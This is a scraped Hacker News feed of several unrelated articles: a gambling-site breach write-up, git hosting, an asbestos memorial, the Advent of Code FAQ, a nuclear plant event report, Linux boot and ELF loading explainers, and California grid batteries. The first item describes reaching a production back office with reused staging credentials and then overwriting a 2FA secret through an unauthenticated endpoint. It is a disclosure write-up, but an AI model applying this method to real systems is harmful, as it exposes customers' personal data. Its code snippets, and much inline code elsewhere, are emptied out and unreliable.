cool to see, but there wasn't any real impact yet.An attacker could maybe exploit this to get a foothold somewhere, but so far, there was no customer data. We decided that we would see if there was an accessible production version of the website somewhere before reporting it.Authenticating to ClubWPT Gold's Back Office (production)We ran the following command to pull subdomains from the core ClubWPT Gold website and just dirty grep for an admin panel: [] [] [] [] [,]
Interesting. There was a coin admin host on the actual ClubWPT Gold website, but it appeared to be configured to use Cloudflare Zero Trust or something.Maybe we could use Censys like we did previously to find the host IP. Shubs went ahead and searched for public certificates for "clubwptgold.com" and found something.We loaded the Censys IP and tried to login using the credentials from the staging website:It worked. We had a valid login to what might be the ClubWPT Gold back office, but this time, there was 2FA.Luckily for us, we had found that previous vulnerability to bypass 2FA when reviewing the staging website's source code:{

      = ();    = ();       = DB.(, where uid = );

     ( exists) {
        
        DB.(, where uid = , data = {
            secret      => ,
            update_time => ()
        });
    }  {
        
        DB.(, data = {
            uid         => ,
            secret      => ,
            create_time => (),
            update_time => ()
        });
    }

    ({
        code => ,
        url  => 
    });
}
The "/admin/otp/bind" endpoint was fully unauthenticated and would allow an attacker to update anyone's 2FA secret via their user ID. We prayed that the user ID on the production website would be the same as the one on staging and sent the following request:

{
  ,
  
}
We successfully updated the 2FA, and then logged in. The data was different from the previous site we'd logged into. There were real Gmails, phone numbers, and customer data. We were logged into production.This was all production data. I searched for my nickname on the user management endpoint, and found all of my KYC data.The back office application had tons of super interesting endpoints. I could see all deposits, AMOE requests, KYC data (including the IP address and exact coordinates of any player), and administrative site statistics like the total deposits and withdrawals.Once we saw customer PII, we stopped immediately and reported the finding. We emailed a bunch of people and opened support tickets, but had the same experience as the past gambling websites. It turns out that there are a lot of people who send a lot of strange emails to gambling websites, so it was very difficult to get in touch with someone who would take us seriously.I'd decided that it was probably best to continue reaching out to people given that we'd overwritten the 2FA secret on one of the accounts, so I reached out to a few of ClubWPT Gold's ambassadors in hopes that they could connect us to someone. In just a few hours, we were in touch with their head of infrastructure.We disclosed the vulnerability and the ClubWPT Gold team fixed everything in just a few hours. They were super receptive and worked with us to make sure that everything was resolved.Thanks to Ian Carroll, Gal Nagli, Joel Margolis, Brett Buerhaus, and Justin Rhinehart for reviewing the post. Thanks to ClubWPT Gold for being very receptive and helpful when disclosing the vulnerability. Thanks to Alexandra Botez for getting us in touch with the ClubWPT Gold team.]]></content:encoded></item><item><title>You already have a Git server</title><link>https://maurycyz.com/misc/easy_git/</link><author>chmaynard</author><category>dev</category><pubDate>Sun, 26 Oct 2025 10:53:37 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[

If you have a git repository on a server with ssh access, you can just clone it:You can then work on it locally and push your changes back to the origin server.
By default, git won’t let you push to the branch that is currently checked out, but this is easy to change:This is a great way to sync code between multiple computers or to work on server-side files without laggy typing or manual copying.
If you want to publish your code, just point your web server at the git repo:… although you will have to run this command server-side to make it cloneable:That’s a lot of work, so let’s set up a hook to do that automatically:Git hooks are just shell scripts, so they can do things like running a static site generator:This is how I’ve been doing this blog for a while now:
It’s very nice to be able to type up posts locally (no network lag), and then push them to the server and have the rest handled automatically.It’s also backed up by default:
If the server breaks, I’ve still got the copy on my laptop, and if my laptop breaks, I can download everything from the server.
Git’s version tracking also prevents accidental deletions, and if something breaks, it’s easy to figure out what caused it.

          This monument popped up in the middle of Barking recently."In Memory of those who lost their lives because of exposure to asbestos".
And it's here because Barking has one of the highest rates of asbestos-related deaths in the country.
Cape Asbestos Company built a huge asbestos factory beside the River Roding in Barking. The company mined asbestos-bearing rock at several sites in South Africa, then shipped them in sacks to a private quay in Barking for processing. Hundreds of people were employed to mill the ore into usable fibres and then process these into lagging, packaging, pipes, resins, boards and all forms of insulation widely used in the building trade. They worked without masks or other protection, the dangers of asbestos either unknown or not thought worth bothering about. And hundreds of workers died, often many years later, of insidious chronic respiratory disease.
32-page booklet published by Cape Asbestos in the days before blue asbestos was recognised as dangerous and banned, which was as late as 1985. It shows workers with rolled-up sleeves and women leaning over unshielded machines, all potentially inhaling enough fibres to ultimately kill them. I read reports about the local school in Barking, barely 100 metres away, saying that the playground was often covered in fine dust which children rolled up and played with as if it were snow. I read that mesothelioma was so common in the area it was known as the ‘Barking Cough’. These were different times, but times that linger on.

Cape Asbestos's plant eventually closed in 1968 and in its place was built the Harts Lane council estate, which is still not the loveliest corner of Barking. It included two tall tower blocks called Colne House and Mersey House, both of which Barking & Dagenham council would now like to demolish. This is chiefly because they're old and covered in combustible cladding, but the additional complications of potentially disturbing polluted land puts any remediation out of financial reach. It's always the insulation you have to watch out for.

The memorial in Barking Town Square comprises a polished chunk of blue pearl granite and was unveiled on Workers' Memorial Day 2022 in a ceremony attended by several trade unionists and representatives of the London Asbestos Support Awareness Group. The emphasis is partly on remembrance and partly on the importance of standing up for workers' rights to make conditions better for all. As the inscription says, "Remember the Dead and Fight for the Living".

My grandfather worked for another Cape Asbestos plant on Tolpits Lane in Watford. Originally it had been run by Universal Asbestos Manufacturing but in 1967 the factory was acquired by Cape as part of a diversification into cement-based products. They made corrugated roofing, flat sheets, decorated sheets, slates, soil pipes, decking for flat roofs and reinforced troughing - that kind of thing - the asbestos moulded into a multiplicity of shapes for the benefit of the building trade.

To him Cape Universal was just a convenient place to work, a short walk across the moor for a day's shift and then home again for tea. He worked there for many years, from the 1930s to the 1960s, rising through the ranks from a labourer to a machine operator on the factory floor. On his death certificate his occupation was listed as 'Asbestos Moulder', and it was very much a premature death because this didn't end well.

I don't remember very much about my grandfather because he died when I was 8. I know he was there when I took my first steps in his back garden and I can remember sitting at his dining room table and hoping nobody would force me to eat the celery. My final memory is being led up to his bedroom, I suspect not long before his death, to see an ill old man laid out in bed and struggling to breathe. I don't know what was said, nor how short a time I stayed in his presence, indeed my strongest recollection is of the room itself with its austere cupboards and the curtains drawn. And then at the age of 67 he was gone.

My family fought for asbestosis to be recognised as his cause of death but were not successful. I've read recently of fellow workers working at the Tolpits Lane factory now getting six figure payouts in compensation, indeed it's hard to research this topic without ending up on legal websites with popups urging you to make a claim. Even four decades after the factory's closure there are still employees severely affected, and many more already passed, as the toxic legacy endures. The factory site is now a rather cleaner industrial estate and business park, indeed it's where the National Lottery's been based for the last 30 years because risk and loss are still in play.

Today my Dad reaches the grand old age of 87, a full 20 years more than his father lived. Science has moved on a long way since the 1970s, also educational opportunities and also workers' rights. Health and safety is sometimes much derided but it can genuinely save lives, even much extend them, rather than everyone continually moaning about additional costs and annoying procedures. If someone had shouted earlier and louder about the dangers of asbestos I might have known my grandfather better, my grandmother could have had many more years of married life and my father could have had a father for much longer.

My Dad lost his Dad at the age of 34, which is no age at all in the grand scheme of things. By contrast I still have my Dad at the age of 60, which has meant an extra quarter century of guidance, support, advice, love and always being there. How lucky am I? Every day we overlap with our parents is a blessing and I've had 22,000 of them, for all of which I'm truly grateful. We're off out later to celebrate with a slap-up dinner, or as slap-up as an 87-year-old stomach requires, which the wider family are greatly looking forward to. What Barking's memorial reminded me is that many families have not been so fortunate, and sometimes that loss can be very close to home.]]></content:encoded></item><item><title>What if tariffs?</title><link>https://www.swatch.com/en-en/what-if-tariffs-so34z106/SO34Z106.html</link><author>Erikun</author><category>dev</category><pubDate>Sun, 26 Oct 2025 08:23:48 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Advent of Code 2025: Number of puzzles reduce from 25 to 12 for the first time</title><link>https://adventofcode.com/2025/about#faq_num_days</link><author>vismit2000</author><category>dev</category><pubDate>Sun, 26 Oct 2025 08:19:48 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[You don't need a computer science background to participate - just a little programming knowledge and some problem solving skills will get you pretty far. Nor do you need a fancy computer; every problem has a solution that completes in at most 15 seconds on ten-year-old hardware.If you'd like to support Advent of Code, you can do so indirectly by helping to  it with others or directly via AoC++.If you get stuck, try your solution against the  given in the puzzle; you should get the same answers.  If not, re-read the description.  Did you misunderstand something?  Is your program doing something you don't expect?  After the examples work, if your answer still isn't correct,  for which you can verify the answer by hand and see if those work with your program.  Make sure you have the entire puzzle input.  If you're still stuck, maybe  for help, or come back to the puzzle later.  You can also ask for hints in the subreddit.--- Frequently Asked Questions ---Is there an easy way to select entire code blocks? You should be able to triple-click code blocks to select them. You'll need JavaScript enabled.#!/usr/bin/env perl
use warnings;
use strict;

print "You can test it out by ";
print "triple-clicking this code.\n";
How does authentication work? Advent of Code uses OAuth to confirm your identity through other services.  When you log in, you only ever give your credentials to that service - never to Advent of Code.  Then, the service you use tells the Advent of Code servers that you're really you.  In general, this reveals no information about you beyond what is already public; here are examples from Reddit and GitHub. Advent of Code will remember your unique ID, names, URL, and image from the service you use to authenticate.Why was this puzzle so easy / hard? The difficulty and subject matter varies throughout each event. Very generally, the puzzles get more difficult over time, but your specific skillset will make each puzzle significantly easier or harder for you than someone else. Making puzzles is tricky.Why do the puzzles unlock at midnight EST/UTC-5? Because that's when I can consistently be available to make sure everything is working. I also have a family, a day job, and even need sleep occasionally. If you can't participate at midnight, that's not a problem; if you want to race, many people use private leaderboards to compete with people in their area.I find the text on the site hard to read. Is there a high contrast mode? There is a high contrast alternate stylesheet. Firefox supports these by default (View -> Page Style -> High Contrast).I have a puzzle idea! Can I send it to you? Please don't. Because of legal issues like copyright and attribution, I don't accept puzzle ideas, and I won't even read your email if it looks like one just in case I use parts of it by accident.Did I find a bug with a puzzle? Once a puzzle has been out for even an hour, many people have already solved it; after that point, bugs are very unlikely. Start by asking on the subreddit.Should I try to get a fast solution time? Maybe. Solving puzzles is hard enough on its own, but trying for a fast time also requires manyadditionalskills and a lot of practice; speed-solves often look nothing like code that would pass a code review. If that sounds interesting, go for it! However, you should do Advent of Code in a way that is useful to you, and so it is completely fine to choose an approach that meets your goals and ignore speed entirely.Why did the number of days per event change? It takes a ton of my free time every year to run Advent of Code, and building the puzzles accounts for the majority of that time. After keeping a consistent schedule for ten years(!), I needed a change. The puzzles still start on December 1st so that the day numbers make sense , and puzzles come out every day (ending mid-December).What happened to the global leaderboard? The global leaderboard was one of the largest sources of stress for me, for the infrastructure, and for many users. People took things too seriously, going way outside the spirit of the contest; some people even resorted to things like DDoS attacks. Many people incorrectly concluded that they were somehow worse programmers because their own times didn't compare. What started as a fun feature in 2015 became an ever-growing problem, and so, after ten years of Advent of Code, I removed the global leaderboard. (However, I've made it so you can share a read-only view of your private leaderboard. Please don't use this feature or data to create a "new" global leaderboard.)While trying to get a fast time on a private leaderboard, may I use AI / watch streamers / check the solution threads / ask a friend for help / etc? If you are a member of any private leaderboards, you should ask the people that run them what their expectations are of their members. If you don't agree with those expectations, you should find a new private leaderboard or start your own! Private leaderboards might have rules like maximum runtime, allowed programming language, what time you can first open the puzzle, what tools you can use, or whether you have to wear a silly hat while working.Should I use AI to solve Advent of Code puzzles? No. If you send a friend to the gym on your behalf, would you expect to get stronger? Advent of Code puzzles are designed to be interesting for humans to solve - no consideration is made for whether AI can or cannot solve a puzzle. If you want practice prompting an AI, there are almost certainly better exercises elsewhere designed with that in mind.Can I copy/redistribute part of Advent of Code? Please don't. Advent of Code is free to , not free to copy. If you're posting a code repository somewhere, please don't include parts of Advent of Code like the puzzle text or your inputs. If you're making a website, please don't make it look like Advent of Code or name it something similar.Advent of Code is a registered trademark in the United States.

        BOTH TRAINS OF CONTROL ROOM EMERGENCY VENTILATION SYSTEM INOPERABLE
The following is a summary of information provided by the licensee via phone and email:
On October 21, 2025, at 0610 CDT, while reloading fuel to the reactor vessel, an electrical perturbation initiated a control room ventilation isolation signal (CRVIS). The control room air conditioning system (CRACS) 'A' train A/C unit did not start upon the CRVIS due to a blown fuse. The 'B' CRACS A/C unit was out of service for planned maintenance at the time. At 1020 CDT, the 'A' train CRACS A/C unit was returned to service. Both trains of the control room emergency ventilation system (CREVS) were inoperable for 10 minutes. Due to both trains of CRACS and CREVS being inoperable, this condition is being reported as an eight-hour, non-emergency notification per 10 CFR 50.72(b)(3)(v).
This condition caused entry into technical specification (TS) limiting condition for operation (LCO) 3.7.10 condition `E' and 3.7.11 condition `D'. Upon discovery of the condition, fuel movement and core alterations were suspended in accordance with the TS LCO required actions.
There was no impact on the health and safety of the public or plant personnel. The NRC Resident Inspector was notified.

A second later a wall of text scrolls by, or a logo fades in, and eventually Linux appears. What happens in between is not magic. It is a careful handshake between tiny programs and a very literal CPU. This part follows that handshake until the very first line of C code inside the Linux kernel runs.The very first instructionWhen power stabilizes, the CPU resets itself to a tiny, old‑fashioned mode called real mode. Real mode dates back to the original 8086 chip. The rules are simple on purpose. Memory addresses are built from two values the CPU keeps in special fast storage called registers. You combine a segment and an offset like this:physical_address = (segment << 4) + offsetIf you see numbers like , that is hexadecimal. Hex is base 16. We write  in front to make that clear.  is 16 in everyday counting.  is 1 megabyte. Hex lines up nicely with how hardware stores bits, which is why you see it everywhere in low‑level code.Right after reset the CPU jumps to a special address called the reset vector at . Think of it as a permanent bookmark that says “start here.” There is room for almost nothing at that address, so manufacturers put a short jump there that passes control to the firmware on your motherboard.
A register is a tiny slot inside the CPU. It holds a number the CPU is using right now. Names like CS and IP are register names. CS means “code segment,” which marks the current neighborhood for instructions. IP means “instruction pointer,” which marks which instruction comes next.The firmware is a small starter program baked into your board.BIOS stands for Basic Input Output System. It is the older style. BIOS does a quick health check called POST, looks at the boot order, and tries each device. If it finds a disk whose very first 512‑byte sector ends with the marker bytes  and , it treats that device as bootable. BIOS copies that sector to memory at  and jumps there. That sector is tiny, so it usually knows only how to load the next, larger piece.UEFI is the modern replacement. It still starts the machine, but it understands filesystems directly and can load bigger boot programs without the old “first sector” dance. UEFI also passes richer information to the operating system. Different path, same goal: hand control to a boot program that can load Linux.The bootloader is the usher that gets the operating system into place. GRUB is a popular choice on PCs. It reads its configuration, shows a menu if you installed one, and loads the Linux kernel into memory. The Linux kernel file actually contains two things:a small setup program that still runs in real modethe larger compressed kernel that will be unpacked a little laterGRUB also fills out a small structure called the setup header with useful facts: where it placed the kernel, where the command line lives, where the initrd is if you have one. Then it jumps into the setup program.The setup program makes a safe roomBefore Linux can do anything interesting, the setup code creates a predictable workspace.It lines up the segment registers so memory copies behave the same way every time. Names you’ll see here are CS for code, DS for data, and SS for stack. It also clears a single CPU bit called the “direction flag” so copy instructions move forward through memory.It creates a stack. The stack is a last‑in, first‑out workbench where functions store temporary values. SS says which segment the stack uses. SP is the pointer to the current top of the stack.It clears a region called BSS. BSS is where global variables that must start as zero live. C code assumes BSS is zero. The setup program writes zeros over that entire span to keep that promise.If you passed  on the kernel command line, the setup code also programs the serial port so it can print very early messages. This is useful when graphics are not ready yet.Finally the setup program asks the firmware “how much usable RAM do we really have and where are the holes.” On old BIOS this is a call people often nickname e820, which returns a simple list of usable and reserved ranges. The kernel will use that list to avoid stepping on the firmware’s toes.With that done, the setup code calls its first C function, which is literally named . We are still in the small old real mode at this point. The next job is to leave it.Tiny explainer: interrupt
An interrupt is a hardware or software “excuse me” that pauses what the CPU is doing and runs a small handler for something urgent. A timer tick is an interrupt. A key press is an interrupt. There are two flavors here. Maskable interrupts follow your rules and can be temporarily blocked so they do not fire during delicate moments. Non‑maskable interrupts, often called NMI, always cut in because they usually report serious hardware issues. We will control both while switching modes so nothing surprises us halfway through.Part 2 — Leaving real mode, stepping through 32‑bit land, and arriving in 64‑bitModern Linux on PCs runs in long mode, which is the 64‑bit mode of x86_64. You cannot jump there directly from real mode. The path is real mode to protected mode and then protected mode to long mode. This part covers that path and explains the vocabulary on the way.Protected mode, without the jargon hazeProtected mode is the 32‑bit world introduced to get past the limits of the 1980s. It adds two central ideas.The Global Descriptor Table, or GDT, is a short list of segment descriptions. A description says “this segment starts here, covers this much, and is allowed to do these things.” Linux keeps this simple. It uses a flat model, which means the base is zero and the size covers the whole 32‑bit space. When everything is flat, addresses look like plain numbers again.The Interrupt Descriptor Table, or IDT, is a directory of “phone numbers” for emergency calls. If an interrupt arrives, the CPU looks up the entry in the IDT and jumps to the handler listed there. During the switch we load a tiny placeholder IDT because we are about to block interrupts anyway. The full‑featured IDT arrives later once the real kernel is in charge.The setup code turns off the noisy parts first. It disables maskable interrupts with a single instruction. It quiets the old PIC chips so hardware interrupts are fully blocked for a moment. It opens the A20 line. This is a historical quirk. Early PCs made addresses wrap at 1 megabyte. Opening A20 removes that wrap so higher addresses work like you expect. It resets the math coprocessor so the floating point state is clean.Then it loads a tiny GDT with only what we need right now and a tiny IDT. Finally it sets a single bit named PE in a control register named CR0 and performs a far jump. That jump reloads the code segment from the GDT and locks in protected mode. It reloads the data and stack segments and fixes the stack pointer to match the new flat world.We are now in 32‑bit protected mode.Tiny explainer: control registers
The CPU has a few special registers for on off switches. CR0 turns on protected mode. CR3 holds the address of the top of the page tables, which we will need in a second. CR4 enables a set of extended features such as larger page table entries.Why we still are not doneLinux wants 64‑bit. That is long mode. Two things are needed.Paging must be on. Paging is the translator between virtual addresses and physical addresses. Programs use virtual addresses. The hardware reads and writes physical memory. Page tables map one to the other in fixed‑size chunks called pages. On PCs a normal page is 4 kilobytes. There are also bigger pages. Early in boot the kernel uses 2 megabyte pages to describe low memory quickly.A single bit named LME in a special register called EFER must be set to allow long mode. EFER is a model specific register, which is a fancy way of saying “a register used for certain CPU features.”Building just enough pagingThe 32‑bit prologue builds a small set of page tables that say “for this region, virtual equals physical.” That is called an identity map. It is enough to flip paging on safely.To make this work the code enables PAE in CR4 so larger entries are used. It builds a minimal set of tables that cover low memory in 2 megabyte chunks. It writes the address of the top table into CR3. Paging is now ready.Finally it sets LME in EFER and performs a far return into a label that is written as 64‑bit code. Long mode is now active. Segments are still “flat,” but addresses and registers are 64‑bit wide.
Switching modes while a live system runs is like changing a car tire while rolling. The code blocks interruptions, prepares the minimum needed tables, flips the bit, and only then invites interrupts back. Slow and steady prevents weird half‑switched states.Part 3 — Unpacking the real kernel, fixing addresses, and why Linux sometimes moves itselfWe have a 64‑bit CPU with paging on and a compressed kernel in memory. Now the small 64‑bit stub does the practical work: get out of the way if needed, unpack the kernel, fix addresses if the kernel is not at its default spot, and jump.Clearing a path and setting safety netsThe stub first figures out where it is actually running. Early code is linked as if it lived at address zero and then computes its real base at runtime. If the planned destination for the decompressed kernel would overlap the stub, it copies itself to a safe place.It clears its own BSS so global state starts clean.It loads a minimal IDT with two handlers. One for page fault and one for NMI. A page fault happens when the CPU cannot find a mapping for a virtual address it just tried to use. In our early identity‑mapped world, the tiny page fault handler can add the missing mapping on the fly and continue. The NMI handler is there so a non‑maskable interrupt does not crash the machine while we are still bringing things up.It also builds identity mappings for the regions it will touch next. That includes the future home of the kernel, the small boot parameters page the bootloader filled in, and the command line buffer.A C function commonly named  takes over. It sets aside a tiny heap for temporary buffers, prints the classic line, and unpacks the kernel using whatever algorithm the kernel was built with. gzip, xz, zstd, lzo, and others all plug into the same wrapper.When the bytes are out, the decompressor reads the kernel’s ELF headers. ELF, short for Executable and Linkable Format, is both a file format and a map. It says which chunks are code, which are data, and exactly where each chunk wants to live. The decompressor copies each chunk where it belongs.If the kernel is being loaded at a different address than it was built for, the decompressor applies relocations. A relocation is a small fix‑up that adjusts a pointer or an instruction that contains an address. The decompressor walks a list of these and patches each place so it points to the right spot in the address space we are actually using.When everything is in place, the decompressor returns the entry point of the real kernel and jumps there, passing a pointer to the boot parameters. From that moment you are in the full kernel. The first function you meet is , and the big initialization begins.Why the kernel sometimes moves itself on purposeYou may see kASLR mentioned in kernel logs. That stands for Kernel Address Space Layout Randomization. The idea is simple. If attackers do not know where the kernel lives in memory, certain attacks get a lot harder.Early in boot, if kASLR is enabled, the decompressor chooses two “bases” at random:a physical base, which is where the bytes will live in RAMa virtual base, the starting virtual address the kernel will use once full paging is set upHow does it choose without breaking anythingIt builds a do not touch list. That includes the decompressor itself, the compressed image, the initial ramdisk, the boot parameters page, and the command line buffer. It can also include ranges you reserve with a  option on the command line.It scans the memory map from firmware to find large free regions. For each free region it counts how many aligned “slots” of the right size would fit. It draws a random number using the best early entropy source it has. On modern CPUs that might be a hardware random instruction. It reduces the number to the total number of slots and picks the matching slot. That becomes the physical base. The virtual base is chosen the same way, but within the kernel’s virtual address window.If nothing suitable exists, the code falls back to the default addresses and prints a small warning. If you pass  on the command line, the randomization step is skipped by design.A quick glossary you can bookmark Base 16 numbers written with .  is 16.  is 1 megabyte. Hex maps cleanly to bits, which is why low‑level code uses it. A tiny slot inside the CPU that holds a number right now. Examples: CS, DS, SS, IP, SP. The two pieces used to build real‑mode addresses. Physical address equals segment times 16 plus offset. Older firmware that starts the machine, checks hardware, and loads the first boot sector into memory. Modern firmware that understands filesystems and loads larger boot programs directly. The usher that places the kernel in memory and passes facts about the system to it. GRUB is a common one. A last‑in, first‑out workbench for functions. SS selects its segment. SP points at the current top. A region where global variables that must start as zero live. The kernel setup code clears it before C runs. A fast “excuse me” from hardware or software. The CPU pauses, runs a small handler, then resumes. Maskable interrupts can be blocked for a moment. NMI cannot. Global Descriptor Table. Short list of segment descriptors. Linux sets it to a simple flat model. Interrupt Descriptor Table. Directory of interrupt handlers. Early boot uses a minimal one. The full kernel installs the real one later. Historical switch that must be opened to address above 1 megabyte correctly on old PCs. 32‑bit mode that introduces the GDT and IDT and allows paging. 64‑bit mode on x86_64. Requires paging and a bit named LME set in the EFER register. The translator from virtual addresses to physical memory. Implemented with page tables. The data structure that maps virtual pages to physical pages. Early boot uses identity maps. Normal pages are 4 KB. Early boot often uses 2 MB pages to cover ground quickly. Control registers. CR0 turns on protected mode. CR3 points to the top of the page tables. CR4 enables extended features such as PAE. A model‑specific register that holds Long Mode Enable among other bits. The kernel’s on‑disk format with a built‑in map of what belongs where. A fix‑up that adjusts addresses when code is loaded at a different base than it was built for. Randomizes kernel base addresses at boot to make exploitation harder.« Your BFT Protocol Will Break in Production

But the state has undergone a quiet shift in recent years, and the California Independent System Operator hasn’t issued a single one of those emergency pleas, known as Flex Alerts, since 2022.Experts and officials say the Golden State has reached a turning point, reflecting years of investment in making its electrical grid stronger, cleaner and more dependable. Much of that is new battery energy storage, which captures and stores electricity for later use. In fact, batteries have been transformative for California, state officials say. In late afternoon, when the sun stops hitting solar panels and people are home using electricity, batteries now push stored solar energy onto the grid. California has invested heavily in the technology, helping it mature and get cheaper in recent years. Battery storage in the state has grown more than  3,000% in six years — from 500 megawatts in 2020 to more than 15,700 megawatts today.“There is no question that the battery fleet that has grown rapidly since 2020, along with the state’s expanding portfolio of other supply and demand-side resources, has been a real game changer for reliability during summer periods of peak demand,” said Elliot Mainzer, CAISO’s president and chief executive.Since then, CAISO has overseen a massive build-out of new energy and storage resources, including more than 26,000 megawatts of new capacity overall, which has also helped make the grid more stable, Mainzer said. The state hasn’t seen rolling blackouts since 2020.“Extreme weather events, wildfires and other emergencies can pose reliability challenges for any bulk electric system,” he said. “But the CAISO battery fleet, along with the additional capacity and close coordination with state and regional partners, have provided an indisputable benefit to reliability.” Already, batteries have enabled the grid to operate with dramatic decreases in the use of planet-warming fossil fuels. Now they’re becoming a more cost-effective and reliable replacement for aging gas-fired power plants, according to Maia Leroy, founder of the California energy consulting firm Lumenergy LLC and co-author of a recent report on the rise of battery storage over gas generation in California. “Historically, Flex Alerts have always come through in summertime when it’s super hot and everyone is cranking their AC,” Leroy said. “But also in the summertime, we’re seeing that gas plants underperform because combustion doesn’t work well with ambient heat. So when we’re able to shift that need from having to use gas plants to something more stable, dispatchable and flexible like battery storage, then we’re able to meet that demand in the summer without having to rely on those underperforming gas plants.” Battery energy storage is not without challenges, however. Lithium-ion batteries — the most common type used for energy storage — typically have about  four to six hours of capacity. It’s enough to support the grid during peak hours as the sun sets, but can still leave some gaps to be filled by natural gas.Nikhil Kumar, program director with the energy policy nonprofit GridLab, said the technology already exists for longer-duration batteries, including through different chemistries such as iron-air batteries, which release energy through oxidation, and flow batteries, which store energy in liquid chemicals that flow through a reactor.Those batteries are not yet as mature and can be more expensive and larger than their lithium-ion counterparts, Kumar said. But a recent GridLab report indicates that equation is changing, with the average cost of a new gas plant often on par with  four-hour lithium-ion batteries and only slightly less expensive than longer-duration battery technologies. “Batteries are going to get cheaper,” Kumar said. “Gas isn’t.” The battery storage shift is occurring as the Trump administration takes steps to stifle solar and other forms of renewable energy in favor of fossil fuels such as oil, gas and coal. At the end of September, the administration announced that it would open 13 million acres of federal lands for coal mining and provide $625 million to recommission or modernize coal-fired powered plants, which officials said would help strengthen the economy, protect jobs and advance American energy.During an hourlong  news conference on the initiative, Interior Secretary Doug Burgum described wind and solar energy as intermittent sources that are “literally dependent on the weather” — but neither he nor any other official mentioned the growth of battery storage that has made those sources more reliable and more promising. It’s not a partisan issue. ERCOT, which operates Texas’ electrical grid, has more than 14,000 megawatts of batteries online, a nearly threefold increase from early 2023. California and Texas are constantly trading places as the top state for battery storage. But Trump has made moves to support the production of batteries in the U.S. Currently, about three-quarters of the world’s batteries are made in China, and Trump’s tariffs — including a proposed 100% tariff on China — have been good for at least one Sacramento-based battery manufacturer, Sparkz.“The administration wants critical material manufacturing to happen in the U.S.,” said Sanjiv Malhotra, founder and chief executive. “They basically are very much in favor of domestic manufacturing of batteries.”Sparkz is making lithium-iron batteries that don’t use nickel and cobalt — a composition that has long been an industry darling but that depends on imported metals. Instead, their lithium-iron-phosphate batteries have a supply chain that is entirely based in the U.S., which means they can take advantage of federal tax credits that favor the production of clean energy components made mostly of domestic parts, Malhotra said. The company’s clients include data centers and utilities. Malhotra added that California has done an excellent job “beefing up” the grid’s storage capacity in the last few years. He said batteries are a major reason why the state hasn’t seen a Flex Alert since 2022.“The numbers basically tell the story that it was all because of, essentially, energy storage,” he said.There is still work to do. While the state’s grid has seen improvements, it is more than a century old and was built primarily for gas plants. Experts and officials agree that it needs additional substantial upgrades and reforms to meet current energy demands and goals. Permitting is also a hurdle, as California typically requires lengthy environmental review for new projects. The state, sometimes controversially, is now speeding review, and recently approved a massive solar and battery storage farm, the Darden Clean Energy Project in Fresno County, through a new fast-track permitting program. It will make enough electricity to power 850,000 homes for four hours, according to the California Energy Commission. Safety remains a considerable concern. In January, a fire tore through one of the world’s largest battery storage facilities in Moss Landing, Monterey County. The facility housed around 100,000 lithium-ion batteries, which are exceptionally dangerous when ignited because they burn extremely hot and cannot be extinguished with water, which can trigger a violent chemical reaction. The blaze emitted dangerous levels of nickel, cobalt and manganese that were measured within miles of the site. “When you’re dealing with large technologies in general, there’s always going to be some kind of danger,” said Leroy, of Lumenergy. “This points to the big need for diversifying the technologies that we use.”Other forms of energy, such as oil and coal, also pose considerable health and safety risks including the emission of air pollution — soot, mercury, nitrogen dioxide and carbon dioxide contributing to climate change. California is in the process of eliminating coal power and expects to be completely coal-free by November. And while natural gas still makes up a large piece of the state’s portfolio, renewables represented nearly 60% of California’s in-state electricity generation in 2024, according to the U.S. Energy Information Administration. The numbers continue to trend upward. In the first six months of this year, CAISO’s grid was powered by 100% clean energy for an average of almost seven hours each day.“We have literally just demonstrated that California is able to run with super clean resources, with backups from natural gas,” said Kumar, of GridLab. “And it works. We don’t have Flex Alerts.”]]></content:encoded></item><item><title>The Journey Before main()</title><link>https://amit.prasad.me/blog/before-main</link><author>amitprasad</author><category>dev</category><pubDate>Sat, 25 Oct 2025 19:33:22 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[A while back, I worked on a RISC-V-based userspace simulator for fun. In doing so, taught myself a lot more than I wanted to know about what happens in-between when the Kernel is asked to run a program, and when the first line of our program’s  function is actually executed. Here’s a summary of that rabbit hole.First question: When is the OS kernel actually asked to run any program? The answer, at least on Linux, is the  system call (“syscall”). Let’s take a quick look at that:This is actually quite straightforward! We pass the name of the exectuable file, a list of arguments, and a list of environment variables. This signals to the kernel where, and how, to start loading the program.Many programming languages provide an interface to execute commands that eventually call  under the hood. For example, in Rust, we have:In these higher-level wrappers, the language’s standard library often handles translation of the command name to a full path, acting similarly to how a shell would resolve the command via the  environment variable. The kernel itself, however, expects a proper path to an executable file.A note on interpreters: If the executable file starts with a shebang (), the kernel will use the shebang-specified interpreter to run the program. For example,  will run the program using the Python interpreter,  will run the program using the Bash shell, etc.What does an executable file look like? On Linux, it’s ELF, which the kernel knows how to parse. Other operating systems have different formats (e.g. Mach-O on MacOS, PE on Windows), but ELF is the most common format on Linux. I won’t go into too much detail here, to keep things brief, but ELF files have grown out of the original  format, and are expressive enough to support pretty much every program you’ll ever write. Here’s what the header of an ELF file looks like:The important parts here are:The “ELF Magic” bytes, which tell the kernel that this is, indeed, an ELF file.  is ASCII for “ELF”!“Class” tells us we’re dealing with a 32-bit executable.“Start of …” tells us  things are in the file, and “Size of …” tells us how big they are; The kernel is effectively given a map of the file.“Entry point address” — Relatively self-explanatory! But we’ll be coming back to this.Other ELF files will have different entries and specific values, but the general structure is what we’re after here.As you can see by the numerous mentions to “RISC-V”, this is an ELF file I compiled and linked targeting the RV32 architecture (which the aforementioned emulator is built for), hence the “32” in “ELF32”, the “RVC” flag, and the “RISC-V” machine type.ELF files contain everything our program needs to run, including the code, data, symbols, and more. We can see this again with the  command with the  flag. Here’s what we care about:These sections contain code (), data (), space for global variables (), shims for accessing shared library functions (), and quite a bit more (including symbol tables for debugging, relocation tables, etc.), most of which we won’t be discussing.So evidently, there’s some code that we care about in the  section, so we copy that and call it a day? Not quite. There’s a massive amount of machinery inside the kernel to make all sorts of programs under all sorts of conditions run.For example, the “PLT” (Procedure Linkage Table) is a section that allows us to call functions in “shared libraries”, for example, , without having to package them alongside our program (“dynamically” vs “statically linking”). The ELF file contains a dynamic section which tells the kernel which shared libraries to load. is the C standard library, which contains all the “useful” functions: , , etc. Various flavors implementing the  interfaces exist, most commonly  and . Most of the binaries that are discussed in this post are compiled and linked against , since it’s much easier to statically link.The symbol table looks something like this:You may 